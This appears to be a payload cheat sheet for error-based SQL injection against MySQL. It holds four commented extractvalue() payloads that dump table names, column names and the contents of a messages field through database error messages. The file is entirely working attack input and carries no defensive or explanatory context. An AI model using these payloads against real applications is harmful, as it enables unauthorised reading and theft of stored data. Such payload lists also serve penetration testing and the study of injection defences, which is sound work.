-- Basic Table name
3 and extractvalue(0x0a,
    CONCAT(0x0a,(
        select
            table_name
        from
            information_schema.tables
        where
            table_schema=database() limit 0,1
        )
    )
)

-- Concatenating two tables' name
3 and extractvalue(0x0a,
    CONCAT(0x0a,(
        CONCAT(
            (select
                table_name
            from
                information_schema.tables
            where
                table_schema=database() limit 0,1
            ),
            (select
                table_name
            from
                information_schema.tables
            where
                table_schema=database() limit 1,1
            )
            )
        )
    )
)

-- Basic Column name
3 and extractvalue(0x0a,
    CONCAT(0x0a,(
        select
            column_name
        from
            information_schema.columns
        where
            table_schema = '' limit 0,1
        )
    )
)

-- Get substrings from a field
3 and extractvalue(0x0a,
    CONCAT(0x0a,(
        select
            SUBSTRING(message, 1, 32) AS ExtractString
        from
            messages limit 0,1
        )
    )
)


